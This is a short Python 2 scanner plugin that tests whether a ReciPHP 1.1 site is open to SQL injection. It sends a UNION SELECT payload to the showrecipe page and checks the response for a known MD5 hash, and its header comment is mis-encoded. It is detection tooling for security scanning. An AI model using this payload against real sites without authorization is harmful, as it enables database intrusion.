#ReciPHP 1.1 SQLע�估�޸�
#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    list=[]
    try:
        
        domain = ob['domain']
        detail=u""
        detail = detail.encode('utf8')
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "index.php?content=showrecipe&id=-3%20union%20select%20md5(12345678901),2,3,4,5--"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if content.find("bfd81ee3ed27ad31c95ca75e21365973")>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:ReciPHP1.1SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:ReciPHP1.1SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    return list

